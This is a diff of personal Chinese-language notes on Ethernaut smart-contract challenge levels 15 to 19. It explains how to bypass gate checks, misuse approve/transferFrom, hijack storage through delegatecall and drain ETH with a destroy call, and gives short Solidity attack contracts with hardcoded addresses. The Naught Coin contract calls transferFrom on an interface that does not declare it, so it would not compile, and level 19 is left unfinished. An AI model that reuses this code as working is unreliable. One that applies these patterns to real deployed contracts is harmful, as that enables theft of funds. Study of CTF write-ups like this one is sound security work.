@@ -196,14 +196,19 @@ contract Hack {
     }
 }
 ```
+
 ## 15. Gatekeeper Two
+
 通过中间合约绕过gateOne,
 在合约构造函数中调用目标函数, 被调用合约中获得的代码段size为0, 从而绕过gateTwo
 利用异或计算规则:A ^ B = C 则 A ^ C = B, gateThree的Key计算如下
+
 ```solidity
 bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
 ```
+
 最终合约
+
 ```solidity
 contract Hack {
     constructor() public {
@@ -213,3 +218,53 @@ contract Hack {
     }
 }
 ```
+
+## 16. Naught Coin
+
+目标合约仅限制msg.sender为玩家, 可以通过合约调用绕过限制
+先approve授权token到攻击合约, 再使用攻击合约调用transferFrom转账
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Coin {
+    function transfer(address _to, uint256 _value) external returns (bool);
+
+    function balanceOf(address t) external view returns (uint256);
+}
+
+contract Hack {
+    function attack() public {
+        Coin c = Coin(0x0eBff6279fa409d47004d66baDD14ea137f04De1);
+        c.transferFrom(address(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f), address(1), c.balanceOf(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f));
+    }
+}
+```
+
+## 17. Preservation
+
+delegatecall调用合约时, 会使用被调合约的代码, 修改当前调用合约对应slot的值,
+利用该特性, 先调用setFirstTime函数修改slot0也就是timeZone1Library的值为攻击合约地址,
+再调用setFirstTime利用攻击合约的代码修改slot2也就是owner的值
+
+```solidity
+contract Hack {
+    uint256 public s1;
+    uint256 public s2;
+    address public s3;
+
+    function setTime(uint256 _timeStamp) public {
+        s3 = 0x3E9436324544C3735Fd1aBd932a9238d8Da6922f; // player地址
+    }
+}
+```
+
+## 18. Recovery
+
+通过区块浏览器查询到创建的SimpleToken合约地址为0xC1a1118fAAB0Ae16A4Ad026D0c30d139B7e0d550
+然后调用该合约的destroy函数获取所有eth
+
+## 19. MagicNumber
+明天再看
+参考: https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2
